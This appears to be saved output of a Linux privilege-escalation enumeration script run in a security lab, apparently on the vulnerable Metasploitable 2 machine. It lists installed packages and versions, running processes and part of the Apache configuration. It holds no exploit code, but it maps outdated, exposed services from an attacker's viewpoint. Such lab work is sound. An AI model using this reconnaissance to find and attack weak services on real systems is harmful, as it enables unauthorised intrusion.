+    libtasn1-3 1.1-1  ASN.1 structures (runtime)
+    libterm-readkey-perl 2.30-3ubuntu1  perl module for simple terminal control
+    libtext-charwidth-perl 0.04-4build1  display widths of characters on the term
+    libtext-iconv-perl 1.4-3  between character sets in Perl
+    libtext-wrapi18n-perl 0.06-5  substitute of Text::Wrap
+    libthai-data 0.1.9-1ubuntu0.2  files for Thai language support library
+    libthai0 0.1.9-1ubuntu0.2  language support library
+    libtiff4 3.8.2-7ubuntu3.4  Image File Format (TIFF) library
+    libtimedate-perl 1.1600-9  and date functions for Perl
+    libtomcat5.5-java 5.5.25-5ubuntu1.2  Servlet engine -- core libraries
+    liburi-perl 1.35.dfsg.1-1  and accesses URI strings
+    libusb-0.1-4 2:0.1.12-8  USB programming library
+    libuuid1 1.40.8-2ubuntu2  unique id library
+    libvolume-id0 117-8  identification library
+    libwrap0 7.6.dbs-14  Venema's TCP wrappers library
+    libwww-perl 5.808-1  client/server library for Perl (aka LWP)
+    libwxbase2.8-0 2.8.7.1-0ubuntu3  library (runtime) - non-GUI support c
+    libwxgtk2.8-0 2.8.7.1-0ubuntu3  Cross-platform C++ GUI toolkit (GT
+    libx11-6 2:1.1.3-1ubuntu2  client-side library
+    libx11-data 2:1.1.3-1ubuntu2  client-side library
+    libxau6 1:1.0.3-2  authorisation library
+    libxaw7 2:1.0.4-1  Athena Widget library
+    libxcb-xlib0 1.1-1ubuntu1  C Binding, Xlib/XCB interface library
+    libxcb1 1.1-1ubuntu1  C Binding
+    libxcomposite1 1:0.4.0-1  Composite extension library
+    libxcursor1 1:1.1.9-1  cursor management library
+    libxdamage1 1:1.1.1-3  damaged region extension library
+    libxdmcp6 1:1.0.2-2  Display Manager Control Protocol library
+    libxerces2-java 2.9.0-1  XML parser for Java with DOM leve
+    libxext6 2:1.0.3-2build1  miscellaneous extension library
+    libxfixes3 1:4.0.3-2  miscellaneous 'fixes' extension library
+    libxfont1 1:1.3.1-2  font rasterisation library
+    libxft2 2.1.12-2ubuntu5  font drawing library for X
+    libxi6 2:1.1.3-1  Input extension library
+    libxinerama1 2:1.0.2-1build1  Xinerama extension library
+    libxkbfile1 1:1.0.4-1  keyboard file manipulation library
+    libxml-parser-perl 2.34-4.3  module for parsing XML files
+    libxml2 2.6.31.dfsg-2ubuntu1  XML library
+    libxmu6 2:1.0.4-1  miscellaneous utility library
+    libxmuu1 2:1.0.4-1  miscellaneous micro-utility library
+    libxpm4 1:3.5.7-1  pixmap library
+    libxrandr2 2:1.2.2-1  RandR extension library
+    libxrender1 1:0.9.4-1  Rendering Extension client library
+    libxss1 1:1.1.2-1  Screen Saver extension library
+    libxt6 1:1.0.5-3  toolkit intrinsics library
+    libxtrap6 2:1.0.0-4build1  event trapping extension library
+    libxtst6 2:1.0.3-1  Testing -- Resource extension library
+    libxv1 2:1.0.3-1ubuntu1  Video extension library
+    libxxf86dga1 2:1.0.2-1  Direct Graphics Access extension library
+    libxxf86misc1 1:1.0.1-2  XFree86 miscellaneous extension library
+    libxxf86vm1 1:1.0.1-2  XFree86 video mode extension library
+    libzephyr3 2.1.20070719.SNAPSHOT-1  original "Instant Message" system librar
+    linux-image-2.6.24-16-server 2.6.24-16.30  kernel image for version 2.6.24 on x86
+    linux-image-server 2.6.24.16.18  kernel image on Server Equipment.
+    linux-libc-dev 2.6.24-27.68  Kernel Headers for development
+    linux-server 2.6.24.16.18  Linux kernel on Server Equipment.
+    linux-ubuntu-modules-2.6.24-16-server 2.6.24-16.23  supplied Linux modules for version 2.
+    locales 2.7.9-4  files for locale support
+    login 1:4.0.18.2-1ubuntu2  login tools
+    logrotate 3.7.1-3  rotation utility
+    lsb-base 3.2-4ubuntu1  Standard Base 3.2 init script function
+    lsb-release 3.2-4ubuntu1  Standard Base version reporting utilit
+    lshw 02.12.01-2ubuntu1  about hardware configuration
+    lsof 4.78.dfsg.1-3  open files
+    ltrace 0.5-3ubuntu1  runtime library calls in dynamically
+    lvm2 2.02.26-1ubuntu9  Linux Logical Volume Manager
+    lzma 4.43-12ubuntu1  method of 7z format in 7-Zip pro
+    m4 1.4.10-1  macro processing language
+    make 3.81-3build1  GNU version of the "make" utility.
+    makedev 2.3.1-84ubuntu1  device files in /dev
+    man-db 2.5.1-3  manual pager
+    manpages 2.77-1  pages about using a GNU/Linux system
+    mawk 1.3.3-11ubuntu2  pattern scanning and text processing langu
+    mdetect 0.5.2.1ubuntu4  device autodetection tool
+    memtest86+ 1.70-3ubuntu1  real-mode memory tester
+    menu 2.1.38ubuntu2  programs menu for all menu-aware a
+    mii-diag 2.11-2  little tool to manipulate network cards
+    mime-support 3.39-1ubuntu1  files 'mime.types' & 'mailcap', and sup
+    mktemp 1.5-5ubuntu2  unique filenames for temporary files
+    mlocate 0.18-2ubuntu1  find files on the filesystem based o
+    module-init-tools 3.3-pre11-4ubuntu5  for managing Linux kernel modules
+    mount 2.13.1-5ubuntu1  for mounting and manipulating filesyst
+    mtr-tiny 0.72-2ubuntu1  screen ncurses traceroute tool
+    mysql-client-5.0 5.0.51a-3ubuntu5  database client binaries
+    mysql-common 5.0.51a-3ubuntu5  database common files
+    mysql-server 5.0.51a-3ubuntu5  database server (meta package dependin
+    mysql-server-5.0 5.0.51a-3ubuntu5  database server binaries
+    nano 2.0.7-1ubuntu1  Pico clone with some new features
+    ncurses-base 5.6+20071124-1ubuntu2  of common terminal types
+    ncurses-bin 5.6+20071124-1ubuntu2  programs and man pages
+    net-tools 1.60-19ubuntu1  NET-3 networking toolkit
+    netbase 4.30ubuntu1  TCP/IP networking system
+    netcat 1.10-36  swiss army knife -- transitional pack
+    netcat-traditional 1.10-36  swiss army knife
+    nfs-common 1:1.1.2-2ubuntu2.2  support files common to client and serve
+    nfs-kernel-server 1:1.1.2-2ubuntu2.2  for NFS kernel server
+    nmap 4.53-3  Network Mapper
+    ntfs-3g 1:1.2216-1ubuntu1  NTFS driver for FUSE
+    ntpdate 1:4.2.4p4+dfsg-3ubuntu2  for setting system time from NTP serv
+    openbsd-inetd 0.20050402-6  OpenBSD Internet Superserver
+    openssh-client 1:4.7p1-8ubuntu1  shell client, an rlogin/rsh/rcp repla
+    openssh-server 1:4.7p1-8ubuntu1  shell server, an rshd replacement
+    openssl 0.9.8g-4ubuntu3  Socket Layer (SSL) binary and related
+    p7zip-full 4.57~dfsg.1-1  and 7za file archivers with high compress
+    parted 1.7.1-5.1ubuntu9  GNU Parted disk partition resizing progr
+    passwd 1:4.0.18.2-1ubuntu2  and administer password and group dat
+    patch 2.5.9-4  a diff file to an original
+    pciutils 1:2.2.4-1.1ubuntu3  PCI Utilities
+    pcmciautils 014-4ubuntu1  utilities for Linux 2.6
+    perl 5.8.8-12ubuntu0.5  Wall's Practical Extraction and Report
+    perl-base 5.8.8-12ubuntu0.5  Pathologically Eclectic Rubbish Lister
+    perl-modules 5.8.8-12ubuntu0.5  Perl modules
+    php5-cgi 5.2.4-2ubuntu5.10  HTML-embedded scripting languag
+    php5-cli 5.2.4-2ubuntu5.10  interpreter for the php5 script
+    php5-common 5.2.4-2ubuntu5.10  files for packages built from the php
+    php5-gd 5.2.4-2ubuntu5.10  module for php5
+    php5-mysql 5.2.4-2ubuntu5.10  module for php5
+    pidgin 1:2.5.2-0ubuntu1.2~hardy1  multi-protocol instant messaging c
+    pidgin-data 1:2.5.2-0ubuntu1.2~hardy1  instant messaging client - da
+    pkg-config 0.22-1  compile and link flags for libraries
+    po-debconf 1.0.10  translated Debconf templates files wi
+    popularity-contest 1.43ubuntu1  for your favourite packages automatical
+    portmap 6.0-4  RPC portmapper
+    postfix 2.5.1-2ubuntu1  mail transport agent
+    postgresql-8.3 8.3.1-1  SQL database, version 8.3
+    postgresql-client-8.3 8.3.1-1  programs for PostgreSQL 8.3
+    postgresql-client-common 87  for multiple PostgreSQL client versi
+    postgresql-common 87  database-cluster manager
+    ppp 2.4.4rel-9ubuntu2  Protocol (PPP) daemon
+    pppconfig 2.3.17ubuntu1  text menu based utility for configuring pp
+    pppoeconf 1.17ubuntu1  PPPoE/ADSL connections
+    procps 1:3.2.7-5ubuntu2  file system utilities
+    proftpd 1.3.1-6ubuntu1  virtual-hosting FTP daemon - bina
+    psmisc 22.6-1  that use the proc filesystem
+    python 2.5.2-0ubuntu1  interactive high-level object-oriented la
+    python-apt 0.7.4ubuntu7  interface to libapt-pkg
+    python-central 0.6.5ubuntu1  and build utility for Python packag
+    python-gdbm 2.5.2-0ubuntu2  dbm database support for Python
+    python-gnupginterface 0.3.2-9ubuntu1  interface to GnuPG (GPG)
+    python-minimal 2.5.2-0ubuntu1  minimal subset of the Python language (def
+    python-support 0.7.5ubuntu1  rebuilding support for python modu
+    python2.5 2.5.2-2ubuntu6.1  interactive high-level object-oriented la
+    python2.5-dev 2.5.2-2ubuntu6.1  files and a static library for Python
+    python2.5-minimal 2.5.2-2ubuntu6.1  minimal subset of the Python language (ver
+    quilt 0.46-4  to work with series of patches
+    rcs 5.7-21  GNU Revision Control System
+    readline-common 5.2-3build1  readline and history libraries, common f
+    reiserfsprogs 1:3.6.19-6  tools for ReiserFS filesystems
+    rhino 1.6.R7-2ubuntu1  engine written in Java
+    rsh-client 0.17-14ubuntu1  clients
+    rsh-server 0.17-14ubuntu1  servers
+    rsync 2.6.9-6ubuntu2  remote file copy program (like rcp)
+    ruby 4.1  interpreter of object-oriented scripting
+    ruby1.8 1.8.6.111-2ubuntu1.3  of object-oriented scripting lan
+    samba 3.0.20-0.1ubuntu1  LanManager-like file and printer server fo
+    samba-common 3.0.20-0.1ubuntu1  common files used by both the server a
+    screen 4.0.3-7ubuntu1  multiplexor with VT100/ANSI termina
+    sed 4.1.5-5  GNU sed stream editor
+    sgml-base 1.26  infrastructure and SGML catalog file su
+    socat 1.6.0.0-1  relay for bidirectional data tr
+    ssl-cert 1.0.14-0ubuntu2  debconf wrapper for openssl
+    startup-tasks 0.3.9-2  of essential tasks to run on sta
+    strace 4.5.15-1.1ubuntu1  system call tracer
+    sudo 1.6.9p10-1ubuntu3  limited super user privileges to spe
+    sysklogd 1.5-1ubuntu1  Logging Daemon
+    system-services 0.3.9-2  of essential system services
+    sysv-rc 2.86.ds1-14.1ubuntu45  runlevel change mechanism
+    sysvutils 2.86.ds1-14.1ubuntu45  utilities
+    tar 1.19-3  version of the tar archiving utility
+    tasksel 2.70ubuntu5  for selecting tasks for installation on
+    tasksel-data 2.70ubuntu5  tasks used for installation of Debi
+    tcpd 7.6.dbs-14  Venema's TCP wrapper utilities
+    tcpdump 3.9.8-2  powerful tool for network monitoring and d
+    telnet 0.17-35ubuntu1  telnet client
+    telnetd 0.17-35ubuntu1  telnet server
+    tftpd 0.17-15ubuntu1  file transfer protocol server
+    tightvncserver 1.2.9-22  network computing server software
+    time 1.7-21build1  GNU time program for measuring cpu resou
+    tomcat5.5 5.5.25-5ubuntu1.2  and JSP engine
+    tomcat5.5-admin 5.5.25-5ubuntu1.2  Servlet engine -- admin & manager web i
+    tomcat5.5-webapps 5.5.25-5ubuntu1.2  Servlet engine -- documentation and exa
+    ttf-dejavu 2.23-1  to pull in ttf-dejavu-core and t
+    ttf-dejavu-core 2.23-1  font family derivate with additional ch
+    ttf-dejavu-extra 2.23-1  font family derivate with additional ch
+    tzdata 2008b-1ubuntu1  zone and daylight-saving time data
+    ubuntu-keyring 2008.03.04  keys of the Ubuntu archive
+    ubuntu-minimal 1.102  core of Ubuntu
+    ubuntu-standard 1.102  Ubuntu standard system
+    ucf 3.005  Configuration File: preserve user cha
+    udev 117-8  device node and kernel event mana
+    ufw 0.16.2  for managing a netfilter firewall
+    unzip 5.52-10ubuntu2  for .zip files
+    update-inetd 4.27-0.6  updater
+    update-manager-core 1:0.87.24  release upgrades
+    upstart 0.3.9-2  init daemon
+    upstart-compat-sysv 0.3.9-2  for System-V-like init
+    upstart-logd 0.3.9-2  logging daemon
+    usbutils 0.73-5ubuntu2  USB utilities
+    util-linux 2.13.1-5ubuntu1  system utilities
+    util-linux-locales 2.13.1-5ubuntu1  files for util-linux
+    uuid-runtime 1.40.8-2ubuntu2  unique id library
+    vim-common 1:7.1-138+1ubuntu3  IMproved - Common files
+    vim-tiny 1:7.1-138+1ubuntu3  IMproved - enhanced vi editor - compact v
+    w3m 0.5.1-5.1ubuntu1  browsable pager with excellent tables/fr
+    wget 1.10.2-3ubuntu1  files from the web
+    whiptail 0.52.2-11.2ubuntu1  user-friendly dialog boxes from she
+    wireless-tools 29-1ubuntu2  for manipulating Linux Wireless Extens
+    wpasupplicant 0.6.0+0.5.8-0ubuntu2  support for WPA and WPA2 (IEEE 802.11
+    x11-apps 7.3+1  applications
+    x11-common 1:7.3+10ubuntu10.2  Window System (X.Org) infrastructure
+    x11-session-utils 7.3+1  session utilities
+    x11-utils 7.3+1  utilities
+    x11-xfs-utils 7.3+1  font server utilities
+    x11-xkb-utils 7.3+1  XKB utilities
+    x11-xserver-utils 7.3+2ubuntu0.1  server utilities
+    xauth 1:1.0.2-2  authentication utility
+    xbase-clients 1:7.3+10ubuntu10.2  X clients - metapackage
+    xbitmaps 1.0.1-2ubuntu1  X bitmaps
+    xfonts-100dpi 1:1.0.0-4  dpi fonts for X
+    xfonts-75dpi 1:1.0.0-4  dpi fonts for X
+    xfonts-base 1:1.0.0-5  fonts for X
+    xfonts-encodings 1:1.0.2-3  for X.Org fonts
+    xfonts-scalable 1:1.0.0-6ubuntu0.8.04.1  fonts for X
+    xfonts-utils 1:1.0.1-2ubuntu1  Window System font utility programs
+    xinetd 1:2.3.14-5  for inetd with many enhancements
+    xinit 1.0.7-2  server initialisation tool
+    xkb-data 1.1~cvs.20080104.1-1ubuntu6  Keyboard Extension (XKB) configuration dat
+    xorg 1:7.3+10ubuntu10.2  X Window System
+    xserver-xorg 1:7.3+10ubuntu10.2  X.Org X server
+    xserver-xorg-core 2:1.4.1~git20080131-1ubuntu9.3  X server - core server
+    xserver-xorg-input-all 1:7.3+10ubuntu10.2  X.Org X server -- input driver metapacka
+    xserver-xorg-input-evdev 1:1.2.0-1ubuntu2  X server -- evdev input driver
+    xserver-xorg-input-kbd 1:1.2.2-3ubuntu1  X server -- keyboard input driver
+    xserver-xorg-input-mouse 1:1.2.3-2  X server -- mouse input driver
+    xserver-xorg-input-synaptics 0.14.7~git20070706-1ubuntu4  TouchPad driver for X.Org server
+    xserver-xorg-input-vmmouse 1:12.4.3-1ubuntu1  X server -- VMMouse input driver to us
+    xserver-xorg-input-wacom 1:0.7.9.8-0ubuntu3  X server -- Wacom input driver
+    xserver-xorg-video-all 1:7.3+10ubuntu10.2  X.Org X server -- output driver metapack
+    xserver-xorg-video-apm 1:1.1.1-10  X server -- APM display driver
+    xserver-xorg-video-ark 1:0.6.0-9  X server -- ark display driver
+    xserver-xorg-video-ati 1:6.8.0-1ubuntu1  X server -- ATI display driver
+    xserver-xorg-video-chips 1:1.1.1-9  X server -- Chips display driver
+    xserver-xorg-video-cirrus 1:1.1.0-8ubuntu1  X server -- Cirrus display driver
+    xserver-xorg-video-cyrix 1:1.1.0-8  X server -- Cyrix display driver
+    xserver-xorg-video-dummy 1:0.2.0-7  X server -- dummy display driver
+    xserver-xorg-video-fbdev 1:0.3.1-4  X server -- fbdev display driver
+    xserver-xorg-video-geode 2.9.0-1ubuntu2.5  server -- Geode GX2/LX display driver
+    xserver-xorg-video-glint 1:1.1.1-8  X server -- Glint display driver
+    xserver-xorg-video-i128 1:1.2.1-4  X server -- i128 display driver
+    xserver-xorg-video-i740 1:1.1.0-7  X server -- i740 display driver
+    xserver-xorg-video-i810 2:1.7.4-0ubuntu7  X server -- Intel i8xx, i9xx display d
+    xserver-xorg-video-imstt 1:1.1.0-7  X server -- IMSTT display driver
+    xserver-xorg-video-intel 2:2.2.1-1ubuntu13.8  X server -- Intel i8xx, i9xx display d
+    xserver-xorg-video-mga 1:1.4.8.dfsg.1-1  X server -- MGA display driver
+    xserver-xorg-video-neomagic 1:1.1.1-8  X server -- Neomagic display driver
+    xserver-xorg-video-newport 1:0.2.1-4ubuntu1  X server -- Newport display driver
+    xserver-xorg-video-nsc 1:2.8.3-2ubuntu0.1  X server -- NSC Geode GX1 display driv
+    xserver-xorg-video-nv 1:2.1.8-1ubuntu1  X server -- NV display driver
+    xserver-xorg-video-openchrome 1:0.2.901-0ubuntu4  X server -- VIA display driver
+    xserver-xorg-video-psb 0.2.1-1ubuntu3  graphics driver for Poulsbo
+    xserver-xorg-video-rendition 1:4.1.3.dfsg.1-4  X server -- Rendition display driver
+    xserver-xorg-video-s3 1:0.5.0-4  X server -- legacy S3 display driver
+    xserver-xorg-video-s3virge 1:1.9.1-7  X server -- S3 ViRGE display driver
+    xserver-xorg-video-savage 1:2.1.3-5  X server -- Savage display driver
+    xserver-xorg-video-siliconmotion 1:1.5.1-3  X server -- SiliconMotion display driv
+    xserver-xorg-video-sis 1:0.9.3-6  X server -- SiS display driver
+    xserver-xorg-video-sisusb 1:0.8.1-9  X server -- SiS USB display driver
+    xserver-xorg-video-tdfx 1:1.3.0-6  X server -- tdfx display driver
+    xserver-xorg-video-tga 1:1.1.0-9ubuntu1  X server -- TGA display driver
+    xserver-xorg-video-trident 1:1.2.4-1  X server -- Trident display driver
+    xserver-xorg-video-tseng 1:1.1.1-4  X server -- Tseng display driver
+    xserver-xorg-video-v4l 1:0.1.1-6ubuntu1  X server -- Video 4 Linux display driv
+    xserver-xorg-video-vesa 1:1.3.0-4ubuntu4  X server -- VESA display driver
+    xserver-xorg-video-vga 1:4.1.0-8  X server -- VGA display driver
+    xserver-xorg-video-via 1:0.2.2-5  X server -- VIA display driver
+    xserver-xorg-video-vmware 1:10.15.2-1ubuntu2  X server -- VMware display driver
+    xserver-xorg-video-voodoo 1:1.1.1-5  X server -- Voodoo display driver
+    xterm 229-1ubuntu1.1  terminal emulator
+    zlib1g 1:1.2.3.3.dfsg-7ubuntu1  library - runtime
+    zlib1g-dev 1:1.2.3.3.dfsg-7ubuntu1  library - development
+
+[+] Current processes
+    USER PID START TIME COMMAND
+    root 1 19:09 0:01 /sbin/init
+    root 2 19:09 0:00 [kthreadd]
+    root 3 19:09 0:00 [migration/0]
+    root 4 19:09 0:00 [ksoftirqd/0]
+    root 5 19:09 0:00 [watchdog/0]
+    root 6 19:09 0:00 [events/0]
+    root 7 19:09 0:00 [khelper]
+    root 41 19:09 0:00 [kblockd/0]
+    root 44 19:09 0:00 [kacpid]
+    root 45 19:09 0:00 [kacpi_notify]
+    root 90 19:09 0:00 [kseriod]
+    root 128 19:09 0:00 [pdflush]
+    root 129 19:09 0:00 [pdflush]
+    root 130 19:09 0:00 [kswapd0]
+    root 172 19:09 0:00 [aio/0]
+    root 1128 19:09 0:00 [ksnapd]
+    root 1318 19:09 0:00 [ata/0]
+    root 1324 19:09 0:00 [ata_aux]
+    root 1343 19:09 0:00 [ksuspend_usbd]
+    root 1347 19:09 0:00 [khubd]
+    root 2042 19:09 0:00 [scsi_eh_0]
+    root 2193 19:09 0:00 [scsi_eh_1]
+    root 2195 19:09 0:00 [scsi_eh_2]
+    root 2204 19:09 0:00 [kjournald]
+    root 2360 19:09 0:00 /sbin/udevd
+    root 2574 19:10 0:00 [kpsmoused]
+    root 3515 19:10 0:00 [kjournald]
+    daemon 3645 19:10 0:00 /sbin/portmap
+    statd 3661 19:10 0:00 /sbin/rpc.statd
+    root 3667 19:10 0:00 [rpciod/0]
+    root 3682 19:10 0:00 /usr/sbin/rpc.idmapd
+    root 3908 19:10 0:00 /sbin/getty
+    root 3909 19:10 0:00 /sbin/getty
+    root 3915 19:10 0:00 /sbin/getty
+    root 3918 19:10 0:00 /sbin/getty
+    root 3921 19:10 0:00 /sbin/getty
+    syslog 3957 19:10 0:00 /sbin/syslogd
+    dhcp 4000 19:10 0:00 dhclient3
+    root 4009 19:10 0:00 /bin/dd
+    klog 4018 19:10 0:00 /sbin/klogd
+    bind 4060 19:10 0:00 /usr/sbin/named
+    root 4082 19:10 0:00 /usr/sbin/sshd
+    root 4158 19:10 0:00 /bin/sh
+    mysql 4200 19:10 0:00 /usr/sbin/mysqld
+    root 4202 19:10 0:00 logger
+    postgres 4279 19:10 0:00 /usr/lib/postgresql/8.3/bin/postgres
+    postgres 4282 19:10 0:00 postgres:
+    postgres 4283 19:10 0:00 postgres:
+    postgres 4284 19:10 0:00 postgres:
+    postgres 4285 19:10 0:00 postgres:
+    daemon 4305 19:10 0:00 distccd
+    daemon 4306 19:10 0:00 distccd
+    root 4355 19:10 0:00 [lockd]
+    root 4356 19:10 0:00 [nfsd4]
+    root 4357 19:10 0:00 [nfsd]
+    root 4358 19:10 0:00 [nfsd]
+    root 4359 19:10 0:00 [nfsd]
+    root 4360 19:10 0:00 [nfsd]
+    root 4361 19:10 0:00 [nfsd]
+    root 4362 19:10 0:00 [nfsd]
+    root 4363 19:10 0:00 [nfsd]
+    root 4364 19:10 0:00 [nfsd]
+    root 4368 19:10 0:00 /usr/sbin/rpc.mountd
+    root 4434 19:10 0:00 /usr/lib/postfix/master
+    postfix 4438 19:10 0:00 pickup
+    postfix 4440 19:10 0:00 qmgr
+    root 4441 19:10 0:00 /usr/sbin/nmbd
+    root 4443 19:10 0:00 /usr/sbin/smbd
+    root 4448 19:10 0:00 /usr/sbin/smbd
+    root 4459 19:10 0:00 /usr/sbin/xinetd
+    proftpd 4498 19:10 0:00 proftpd:
+    daemon 4502 19:10 0:00 distccd
+    daemon 4513 19:10 0:00 /usr/sbin/atd
+    root 4524 19:10 0:00 /usr/sbin/cron
+    root 4552 19:10 0:00 /usr/bin/jsvc
+    root 4553 19:10 0:00 /usr/bin/jsvc
+    tomcat55 4555 19:10 0:13 /usr/bin/jsvc
+    daemon 4573 19:10 0:00 distccd
+    root 4574 19:10 0:00 /usr/sbin/apache2
+    www-data 4575 19:10 0:00 /usr/sbin/apache2
+    www-data 4576 19:10 0:00 /usr/sbin/apache2
+    www-data 4578 19:10 0:00 /usr/sbin/apache2
+    www-data 4581 19:10 0:00 /usr/sbin/apache2
+    root 4593 19:10 0:00 /usr/bin/rmiregistry
+    root 4597 19:10 0:01 ruby
+    root 4608 19:10 0:00 /bin/login
+    root 4612 19:10 0:01 Xtightvnc
+    root 4614 19:10 0:00 /usr/bin/unrealircd
+    root 4621 19:10 0:00 /bin/sh
+    root 4624 19:10 0:00 xterm
+    root 4629 19:10 0:01 fluxbox
+    root 4663 19:10 0:00 -bash
+    msfadmin 4709 19:10 0:00 -bash
+    www-data 5029 19:19 0:00 /usr/sbin/apache2
+    www-data 5086 19:19 0:00 /usr/sbin/apache2
+    www-data 5089 19:19 0:00 /usr/sbin/apache2
+    www-data 5148 19:19 0:00 /usr/sbin/apache2
+    www-data 5155 19:19 0:00 /usr/sbin/apache2
+    www-data 5157 19:19 0:00 /usr/sbin/apache2
+    root 5918 19:29 0:00 bash
+    msfadmin 5930 19:29 0:00 su
+    msfadmin 5931 19:29 0:00 -su
+    msfadmin 5932 19:29 0:00 python
+    msfadmin 6804 19:29 0:00 /bin/sh
+    msfadmin 6805 19:29 0:00 ps
+
+[+] Apache Version and Modules
+
+[+] Apache Config File
+    #
+    # Based upon the NCSA server configuration files originally by Rob McCool.
+    #
+    # This is the main Apache server configuration file.  It contains the
+    # configuration directives that give the server its instructions.
+    # See http://httpd.apache.org/docs/2.2/ for detailed information about
+    # the directives.
+    #
+    # Do NOT simply read the instructions in here without understanding
+    # what they do.  They're here only as hints or reminders.  If you are unsure
+    # consult the online docs. You have been warned.
+    #
+    # The configuration directives are grouped into three basic sections:
+    #  1. Directives that control the operation of the Apache server process as a
+    #     whole (the 'global environment').
+    #  2. Directives that define the parameters of the 'main' or 'default' server,
+    #     which responds to requests that aren't handled by a virtual host.
+    #     These directives also provide default values for the settings
+    #     of all virtual hosts.
+    #  3. Settings for virtual hosts, which allow Web requests to be sent to
+    #     different IP addresses or hostnames and have them handled by the
+    #     same Apache server process.
+    #
+    # Configuration and logfile names: If the filenames you specify for many
+    # of the server's control files begin with "/" (or "drive:/" for Win32), the
+    # server will use that explicit path.  If the filenames do *not* begin
+    # with "/", the value of ServerRoot is prepended -- so "/var/log/apache2/foo.log"
+    # with ServerRoot set to "" will be interpreted by the
+    # server as "//var/log/apache2/foo.log".
+    #
+    ### Section 1: Global Environment
+    #
+    # The directives in this section affect the overall operation of Apache,
+    # such as the number of concurrent requests it can handle or where it
+    # can find its configuration files.
+    #
+    #
+    # ServerRoot: The top of the directory tree under which the server's
+    # configuration, error, and log files are kept.
+    #
+    # NOTE!  If you intend to place this on an NFS (or otherwise network)
+    # mounted filesystem then please read the LockFile documentation (available
+    # at <URL:http://httpd.apache.org/docs-2.1/mod/mpm_common.html#lockfile>);
+    # you will save yourself a lot of trouble.
+    #
+    # Do NOT add a slash at the end of the directory path.
+    #
+    ServerRoot "/etc/apache2"
+    #
+    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+    #
+    #<IfModule !mpm_winnt.c>
+    #<IfModule !mpm_netware.c>
+    LockFile /var/lock/apache2/accept.lock
+    #</IfModule>
+    #</IfModule>
+    #
+    # PidFile: The file in which the server should record its process
+    # identification number when it starts.
+    # This needs to be set in /etc/apache2/envvars
+    #
+    PidFile ${APACHE_PID_FILE}
+    #
+    # Timeout: The number of seconds before receives and sends time out.
+    #
+    Timeout 300
+    #
+    # KeepAlive: Whether or not to allow persistent connections (more than
+    # one request per connection). Set to "Off" to deactivate.
+    #
+    KeepAlive On
+    #
+    # MaxKeepAliveRequests: The maximum number of requests to allow
+    # during a persistent connection. Set to 0 to allow an unlimited amount.
+    # We recommend you leave this number high, for maximum performance.
+    #
+    MaxKeepAliveRequests 100
+    #
+    # KeepAliveTimeout: Number of seconds to wait for the next request from the
+    # same client on the same connection.
+    #
+    KeepAliveTimeout 15
+    ##
+    ## Server-Pool Size Regulation (MPM specific)
+    ##
+    # prefork MPM
+    # StartServers: number of server processes to start
+    # MinSpareServers: minimum number of server processes which are kept spare
+    # MaxSpareServers: maximum number of server processes which are kept spare
+    # MaxClients: maximum number of server processes allowed to start
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_prefork_module>
+    StartServers          5
+    MinSpareServers       5
+    MaxSpareServers      10
+    MaxClients          150
+    MaxRequestsPerChild   0
+    </IfModule>
+    # worker MPM
+    # StartServers: initial number of server processes to start
+    # MaxClients: maximum number of simultaneous client connections
+    # MinSpareThreads: minimum number of worker threads which are kept spare
+    # MaxSpareThreads: maximum number of worker threads which are kept spare
+    # ThreadsPerChild: constant number of worker threads in each server process
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_worker_module>
+    StartServers          2
+    MaxClients          150
+    MinSpareThreads      25
+    MaxSpareThreads      75
+    ThreadsPerChild      25
+    MaxRequestsPerChild   0
+    </IfModule>
+    # These need to be set in /etc/apache2/envvars
+    User ${APACHE_RUN_USER}
+    Group ${APACHE_RUN_GROUP}
+    #
+    # AccessFileName: The name of the file to look for in each directory
+    # for additional configuration directives.  See also the AllowOverride
+    # directive.
+    #
+    AccessFileName .htaccess
+    #
+    # The following lines prevent .htaccess and .htpasswd files from being
+    # viewed by Web clients.
+    #
+    <Files ~ "^\.ht">
+    Order allow,deny
+    Deny from all
+    </Files>
+    #
+    # DefaultType is the default MIME type the server will use for a document
+    # if it cannot otherwise determine one, such as from filename extensions.
+    # If your server contains mostly text or HTML documents, "text/plain" is
+    # a good value.  If most of your content is binary, such as applications
+    # or images, you may want to use "application/octet-stream" instead to
+    # keep browsers from trying to display binary files as though they are
+    # text.
+    #
+    DefaultType text/plain
+    #
+    # HostnameLookups: Log the names of clients or just their IP addresses
+    # e.g., www.apache.org (on) or 204.62.129.132 (off).
+    # The default is off because it'd be overall better for the net if people
+    # had to knowingly turn this feature on, since enabling it means that
+    # each client request will result in AT LEAST one lookup request to the
+    # nameserver.
+    #
+    HostnameLookups Off
+    # ErrorLog: The location of the error log file.
+    # If you do not specify an ErrorLog directive within a <VirtualHost>
+    # container, error messages relating to that virtual host will be
+    # logged here.  If you *do* define an error logfile for a <VirtualHost>
+    # container, that host's errors will be logged there and not here.
+    #
+    ErrorLog /var/log/apache2/error.log
+    #
+    # LogLevel: Control the number of messages logged to the error_log.
+    # Possible values include: debug, info, notice, warn, error, crit,
+    # alert, emerg.
+    #
+    LogLevel warn
+    # Include module configuration:
+    Include /etc/apache2/mods-enabled/*.load
+    Include /etc/apache2/mods-enabled/*.conf
+    # Include all the user configurations:
+    Include /etc/apache2/httpd.conf
+    # Include ports listing
+    Include /etc/apache2/ports.conf
+    #
+    # The following directives define some format nicknames for use with
+    # a CustomLog directive (see below).
+    # If you are behind a reverse proxy, you might want to change %h into %{X-Forwarded-For}i
+    #
+    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %b" common
+    LogFormat "%{Referer}i -> %U" referer
+    LogFormat "%{User-agent}i" agent
+    #
+    # ServerTokens
+    # This directive configures what you return as the Server HTTP response
+    # Header. The default is 'Full' which sends information about the OS-Type
+    # and compiled in modules.
+    # Set to one of:  Full | OS | Minor | Minimal | Major | Prod
+    # where Full conveys the most information, and Prod the least.
+    #
+    ServerTokens Full
+    #
+    # Optionally add a line containing the server version and virtual host
+    # name to server-generated pages (internal error documents, FTP directory
+    # listings, mod_status and mod_info output etc., but not CGI generated
+    # documents or custom error documents).
+    # Set to "EMail" to also include a mailto: link to the ServerAdmin.
+    # Set to one of:  On | Off | EMail
+    #
+    ServerSignature On
+    #
+    # Customizable error responses come in three flavors:
+    # 1) plain text 2) local redirects 3) external redirects
+    #
+    # Some examples:
+    #ErrorDocument 500 "The server made a boo boo."
+    #ErrorDocument 404 /missing.html
